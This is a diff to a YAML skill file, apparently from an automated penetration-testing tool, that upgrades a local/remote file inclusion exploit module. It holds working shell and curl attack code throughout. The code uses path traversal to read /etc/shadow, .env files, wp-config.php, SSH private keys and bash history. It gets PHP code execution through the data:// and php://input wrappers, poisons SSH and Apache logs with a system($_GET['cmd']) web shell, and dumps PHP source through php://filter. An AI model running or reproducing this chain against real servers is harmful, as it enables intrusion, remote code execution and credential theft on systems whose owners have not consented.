@@ -1,7 +1,7 @@
 skill_id: lfi_rfi_exploit
 name: "本地/远程文件包含 (LFI/RFI)"
 category: web_rce
-version: "2.0"
+version: "3.0"
 
 principle: |
   文件包含漏洞允许攻击者读取服务器文件或执行代码。
@@ -34,7 +34,7 @@ probes:
         local url="$1"
         local result
         result=$(curl -s "$url" --max-time 6 2>/dev/null)
-        if echo "$result" | grep -q "root:x:0"; then
+        if echo "$result" | grep -qE '^[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:'; then
           echo "$result" | head -5
           return 0
         fi
@@ -76,12 +76,12 @@ probes:
       echo "LFI_NOT_FOUND"
     timeout: 120
     parse_rules:
-      - if_contains: ["LFI_FOUND"]
-        set: { lfi_confirmed: true, lfi_type: "param" }
-      - if_contains: ["LFI_PATH_FOUND"]
-        set: { lfi_confirmed: true, lfi_type: "path" }
-      - if_contains: ["LFI_BYPASS_FOUND"]
-        set: { lfi_confirmed: true, lfi_type: "bypass" }
+      - if_regex: "LFI_FOUND:(\\w+):(\\d+)"
+        set: { lfi_confirmed: true, lfi_type: "param", lfi_param: "$1", lfi_depth: "$2" }
+      - if_regex: "LFI_PATH_FOUND:(.+?):(\\d+)"
+        set: { lfi_confirmed: true, lfi_type: "path", lfi_path: "$1", lfi_depth: "$2" }
+      - if_regex: "LFI_BYPASS_FOUND:(\\w+):(\\d+):(.+)"
+        set: { lfi_confirmed: true, lfi_type: "bypass", lfi_param: "$1", lfi_depth: "$2", lfi_bypass: "$3" }
 
   - id: enumerate_files
     description: "利用已确认的 LFI 读取高价值文件（密码、日志、密钥、配置）"
@@ -90,8 +90,24 @@ probes:
       BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
       echo "=== LFI File Enumeration ==="
 
-      LFI_PARAM="page"
-      LFI_DEPTH=5
+      LFI_PARAM="{lfi_param}"
+      LFI_DEPTH="{lfi_depth}"
+      LFI_PATH="{lfi_path}"
+
+      [ -z "$LFI_PARAM" ] && LFI_PARAM="page"
+      [ "$LFI_DEPTH" = "{lfi_depth}" ] && LFI_DEPTH="5"
+      [ "$LFI_PARAM" = "{lfi_param}" ] && LFI_PARAM="page"
+
+      build_url() {
+        local target_file="$1"
+        local TRAV
+        TRAV=$(printf '../%.0s' $(seq 1 $LFI_DEPTH))
+        if [ -n "$LFI_PATH" ] && [ "$LFI_PATH" != "{lfi_path}" ]; then
+          echo "$BASE${LFI_PATH}${TRAV}${target_file}"
+        else
+          echo "$BASE/?$LFI_PARAM=${TRAV}${target_file}"
+        fi
+      }
 
       TARGETS="/etc/shadow
       /etc/hosts
@@ -115,10 +131,10 @@ probes:
       /var/www/html/wp-config.php
       /var/www/html/.env"
 
-      TRAV=$(printf '../%.0s' $(seq 1 $LFI_DEPTH))
       READABLE=""
       for f in $TARGETS; do
-        result=$(curl -s "$BASE/?$LFI_PARAM=${TRAV}${f}" --max-time 6 2>/dev/null)
+        url=$(build_url "$f")
+        result=$(curl -s "$url" --max-time 6 2>/dev/null)
         size=${#result}
         if [ "$size" -gt 10 ] && ! echo "$result" | grep -qi "not found\|no such\|failed to open\|warning.*include"; then
           echo "READABLE:$f ($size bytes)"
@@ -128,11 +144,13 @@ probes:
         fi
       done
 
-      PASSWD=$(curl -s "$BASE/?$LFI_PARAM=${TRAV}etc/passwd" --max-time 6 2>/dev/null)
+      passwd_url=$(build_url "etc/passwd")
+      PASSWD=$(curl -s "$passwd_url" --max-time 6 2>/dev/null)
       USERS=$(echo "$PASSWD" | grep -E ":/home/" | cut -d: -f1)
       for user in $USERS; do
         for keyfile in ".ssh/id_rsa" ".ssh/authorized_keys" ".bash_history"; do
-          result=$(curl -s "$BASE/?$LFI_PARAM=${TRAV}home/$user/$keyfile" --max-time 6 2>/dev/null)
+          url=$(build_url "home/$user/$keyfile")
+          result=$(curl -s "$url" --max-time 6 2>/dev/null)
           if [ ${#result} -gt 20 ] && ! echo "$result" | grep -qi "not found\|no such\|failed"; then
             echo "USER_FILE_READABLE:/home/$user/$keyfile"
             echo "$result" | head -10
@@ -177,19 +195,26 @@ exploit_paths:
       lfi_confirmed: true
     steps:
       - id: try_data_wrapper
-        description: "data:// wrapper 执行系统命令"
+        description: "data:// wrapper 执行系统命令（优先使用已确认参数）"
         command: |
           BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
           echo "=== PHP data:// Wrapper RCE ==="
-          for param in page file include path image content template; do
+          CONFIRMED="{lfi_param}"
+          [ "$CONFIRMED" = "{lfi_param}" ] && CONFIRMED=""
+          if [ -n "$CONFIRMED" ]; then
+            PARAMS="$CONFIRMED page file include path image content template"
+          else
+            PARAMS="page file include path image content template"
+          fi
+          for param in $PARAMS; do
             result=$(curl -s "$BASE/?$param=data://text/plain,<?php%20system('id');?>" --max-time 8 2>/dev/null)
-            if echo "$result" | grep -q "uid="; then
+            if echo "$result" | grep -qE 'uid=[0-9]+'; then
               echo "DATA_WRAPPER_RCE:$param"
               echo "$result" | grep "uid="
               exit 0
             fi
             result=$(curl -s "$BASE/?$param=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==" --max-time 8 2>/dev/null)
-            if echo "$result" | grep -q "uid="; then
+            if echo "$result" | grep -qE 'uid=[0-9]+'; then
               echo "DATA_WRAPPER_B64_RCE:$param"
               echo "$result" | grep "uid="
               exit 0
@@ -198,7 +223,7 @@ exploit_paths:
           echo "DATA_WRAPPER_FAILED"
         timeout: 60
         success_criteria:
-          stdout_contains_any: ["uid=", "DATA_WRAPPER_RCE", "DATA_WRAPPER_B64_RCE"]
+          stdout_regex: "uid=[0-9]+"
         on_success: conclude_success
         on_fail: try_input_wrapper
         evidence_capture:
@@ -209,9 +234,16 @@ exploit_paths:
         command: |
           BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
           echo "=== PHP php://input Wrapper RCE ==="
-          for param in page file include path image content template; do
+          CONFIRMED="{lfi_param}"
+          [ "$CONFIRMED" = "{lfi_param}" ] && CONFIRMED=""
+          if [ -n "$CONFIRMED" ]; then
+            PARAMS="$CONFIRMED page file include path image content template"
+          else
+            PARAMS="page file include path image content template"
+          fi
+          for param in $PARAMS; do
             result=$(curl -s "$BASE/?$param=php://input" -d '<?php system("id"); ?>' --max-time 8 2>/dev/null)
-            if echo "$result" | grep -q "uid="; then
+            if echo "$result" | grep -qE 'uid=[0-9]+'; then
               echo "INPUT_WRAPPER_RCE:$param"
               echo "$result" | grep "uid="
               exit 0
@@ -220,7 +252,7 @@ exploit_paths:
           echo "INPUT_WRAPPER_FAILED"
         timeout: 60
         success_criteria:
-          stdout_contains_any: ["uid=", "INPUT_WRAPPER_RCE"]
+          stdout_regex: "uid=[0-9]+"
         on_success: conclude_success
         on_fail: next_path
         evidence_capture:
@@ -233,7 +265,7 @@ exploit_paths:
       lfi_confirmed: true
     steps:
       - id: log_poison_ssh
-        description: "SSH 日志注入 + 多深度 LFI 包含 auth.log"
+        description: "SSH 日志注入 + LFI 包含 auth.log（使用已确认参数和深度）"
         command: |
           BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
           echo "=== SSH Log Poisoning ==="
@@ -241,12 +273,23 @@ exploit_paths:
             '<?php system($_GET["cmd"]);?>'@{TARGET_IP} 2>&1 || true
           sleep 2
 
-          for depth in 3 4 5 6 7 8 9 10; do
+          CONFIRMED_PARAM="{lfi_param}"
+          CONFIRMED_DEPTH="{lfi_depth}"
+          [ "$CONFIRMED_PARAM" = "{lfi_param}" ] && CONFIRMED_PARAM=""
+          [ "$CONFIRMED_DEPTH" = "{lfi_depth}" ] && CONFIRMED_DEPTH=""
+
+          if [ -n "$CONFIRMED_PARAM" ]; then
+            PARAMS="$CONFIRMED_PARAM page file include path image content template"
+          else
+            PARAMS="page file include path image content template"
+          fi
+
+          for depth in 1 2 3 4 5 6 7 8 9 10; do
             TRAV=$(printf '../%.0s' $(seq 1 $depth))
             for logpath in var/log/auth.log var/log/secure var/log/sshd.log; do
-              for param in page file include path image content template; do
+              for param in $PARAMS; do
                 result=$(curl -s "$BASE/?$param=${TRAV}${logpath}&cmd=id" --max-time 8 2>/dev/null)
-                if echo "$result" | grep -q "uid="; then
+                if echo "$result" | grep -qE 'uid=[0-9]+'; then
                   echo "SSH_LOG_POISON_RCE:$param:$depth:$logpath"
                   echo "$result" | grep "uid="
                   exit 0
@@ -255,9 +298,9 @@ exploit_paths:
             done
           done
           echo "SSH_LOG_POISON_FAILED"
-        timeout: 60
+        timeout: 90
         success_criteria:
-          stdout_contains_any: ["uid=", "SSH_LOG_POISON_RCE"]
+          stdout_regex: "uid=[0-9]+"
         on_success: conclude_success
         on_fail: log_poison_apache
         evidence_capture:
@@ -271,13 +314,21 @@ exploit_paths:
           curl -s "$BASE/" -H 'User-Agent: <?php system($_GET["cmd"]);?>' --max-time 5 >/dev/null 2>&1 || true
           sleep 1
 
+          CONFIRMED_PARAM="{lfi_param}"
+          [ "$CONFIRMED_PARAM" = "{lfi_param}" ] && CONFIRMED_PARAM=""
+          if [ -n "$CONFIRMED_PARAM" ]; then
+            PARAMS="$CONFIRMED_PARAM page file include path image content template"
+          else
+            PARAMS="page file include path image content template"
+          fi
+
           LOGS="var/log/apache2/access.log var/log/apache2/error.log var/log/nginx/access.log var/log/nginx/error.log var/log/httpd/access_log var/log/httpd/error_log"
-          for depth in 3 4 5 6 7 8 9 10; do
+          for depth in 1 2 3 4 5 6 7 8 9 10; do
             TRAV=$(printf '../%.0s' $(seq 1 $depth))
             for logpath in $LOGS; do
-              for param in page file include path image content template; do
+              for param in $PARAMS; do
                 result=$(curl -s "$BASE/?$param=${TRAV}${logpath}&cmd=id" --max-time 8 2>/dev/null)
-                if echo "$result" | grep -q "uid="; then
+                if echo "$result" | grep -qE 'uid=[0-9]+'; then
                   echo "APACHE_LOG_POISON_RCE:$param:$depth:$logpath"
                   echo "$result" | grep "uid="
                   exit 0
@@ -286,9 +337,9 @@ exploit_paths:
             done
           done
           echo "APACHE_LOG_POISON_FAILED"
-        timeout: 60
+        timeout: 90
         success_criteria:
-          stdout_contains_any: ["uid=", "APACHE_LOG_POISON_RCE"]
+          stdout_regex: "uid=[0-9]+"
         on_success: conclude_success
         on_fail: next_path
         evidence_capture:
@@ -301,14 +352,30 @@ exploit_paths:
       lfi_confirmed: true
     steps:
       - id: read_passwd_confirm
-        description: "多深度读取 /etc/passwd 确认 LFI"
+        description: "使用已确认参数和深度读取 /etc/passwd"
         command: |
           BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+
+          CONFIRMED_PARAM="{lfi_param}"
+          CONFIRMED_DEPTH="{lfi_depth}"
+          [ "$CONFIRMED_PARAM" = "{lfi_param}" ] && CONFIRMED_PARAM=""
+          [ "$CONFIRMED_DEPTH" = "{lfi_depth}" ] && CONFIRMED_DEPTH=""
+
+          if [ -n "$CONFIRMED_PARAM" ] && [ -n "$CONFIRMED_DEPTH" ]; then
+            TRAV=$(printf '../%.0s' $(seq 1 $CONFIRMED_DEPTH))
+            result=$(curl -s "$BASE/?$CONFIRMED_PARAM=${TRAV}etc/passwd" --max-time 6 2>/dev/null)
+            if echo "$result" | grep -qE '^[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:'; then
+              echo "LFI_PASSWD_OK:$CONFIRMED_PARAM:$CONFIRMED_DEPTH"
+              echo "$result"
+              exit 0
+            fi
+          fi
+
           for depth in 1 2 3 4 5 6 7 8 9 10; do
             TRAV=$(printf '../%.0s' $(seq 1 $depth))
             for param in page file include path image content template; do
               result=$(curl -s "$BASE/?$param=${TRAV}etc/passwd" --max-time 6 2>/dev/null)
-              if echo "$result" | grep -q "root:x:0"; then
+              if echo "$result" | grep -qE '^[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:'; then
                 echo "LFI_PASSWD_OK:$param:$depth"
                 echo "$result"
                 exit 0
@@ -318,7 +385,7 @@ exploit_paths:
           echo "LFI_PASSWD_FAILED"
         timeout: 60
         success_criteria:
-          stdout_contains_any: ["root:x:0", "LFI_PASSWD_OK"]
+          stdout_regex: "^[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:"
         on_success: conclude_success
         on_fail: next_path
         evidence_capture:
@@ -331,11 +398,18 @@ exploit_paths:
       lfi_confirmed: true
     steps:
       - id: php_filter
-        description: "用 php://filter 读取源码"
+        description: "用 php://filter 读取源码（优先使用已确认参数）"
         command: |
           BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
           echo "=== PHP Filter Chain ==="
-          for param in page file include path image content template; do
+          CONFIRMED="{lfi_param}"
+          [ "$CONFIRMED" = "{lfi_param}" ] && CONFIRMED=""
+          if [ -n "$CONFIRMED" ]; then
+            PARAMS="$CONFIRMED page file include path image content template"
+          else
+            PARAMS="page file include path image content template"
+          fi
+          for param in $PARAMS; do
             result=$(curl -s "$BASE/?$param=php://filter/convert.base64-encode/resource=index" --max-time 10 2>/dev/null)
             if [ ${#result} -gt 20 ]; then
               echo "PHP_FILTER_OK:$param"
